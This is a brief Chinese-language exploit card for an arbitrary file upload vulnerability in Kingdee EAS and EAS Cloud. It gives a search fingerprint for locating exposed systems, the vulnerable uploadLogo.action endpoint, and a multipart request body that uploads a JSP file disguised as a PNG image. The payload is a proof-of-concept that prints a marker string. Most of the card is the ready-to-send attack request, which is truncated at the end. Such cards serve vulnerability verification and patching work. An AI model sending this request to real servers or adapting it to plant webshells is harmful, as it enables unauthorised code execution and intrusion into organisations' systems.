# 金蝶EAS与EASCloud任意文件上传漏洞

- **系统**：金蝶　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="Kingdee-EAS"`
- **请求**：`POST /plt_portal/setting/uploadLogo.action HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d…`

**请求体 / payload**
```
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="chooseLanguage_top"; filename="chooseLanguage_top"
ab
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="dataCenter"; filename="dataCenter"
ac
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="insId"; filename="insId"
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="type"; filename="type"
ad
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="upload"; filename="dutesite.jsp"
Content-Type: image/png
<%out.print("dudesite");%>
--048445…（脚本共 628 字，完整版见原文）
```
- **预期**：200　|　nullLogo